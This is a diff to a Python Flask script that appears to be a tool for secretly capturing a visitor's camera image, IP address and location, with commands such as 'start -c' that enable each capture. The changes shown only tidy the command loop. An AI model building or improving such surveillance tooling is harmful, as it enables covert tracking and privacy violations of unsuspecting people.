@@ -122,6 +122,7 @@ def capture_image():
         return jsonify({"status": "success", "image_url": image_url})
     return jsonify({'error': 'Camera capture is disabled'}), 403
 
+
 @app.route('/send_ip', methods=['POST'])
 def send_ip():
     data = request.get_json()
@@ -136,6 +137,7 @@ def send_location():
     print(f"User Location: {location_url}")
     return jsonify({"status": "success"})
 
+
 def interactive_prompt():
     global enable_camera, enable_ip, enable_location
     server_process = None
@@ -146,6 +148,8 @@ def interactive_prompt():
         
             if command == "open --help":
                 print_help()
+                # Do not start the server
+                continue
             
             elif command == "start -c":
                 enable_camera = True
@@ -166,6 +170,16 @@ def interactive_prompt():
                 enable_camera = enable_ip = enable_location = True
                 print(f"{G}All functionalities enabled (camera, IP, location).{W}")
 
+            elif command == "":
+                # Ignore empty input
+                continue
+
+            else:
+                print(f"{R}Note*: Use --help to see available commands.{W}")
+                # Do not start the server
+                continue
+            
+            # Start the server only for valid commands that enable functionalities
             if server_process is None or not server_process.is_alive():
                 server_process = Process(target=run_server)
                 server_process.start()
@@ -179,9 +193,8 @@ def interactive_prompt():
                 print(f"\n{R}Exiting main script.{W}")
                 sys.exit(0)
 
+
 if __name__ == "__main__":
     show_ascii_art()
     info_frist()
     interactive_prompt()
-
-
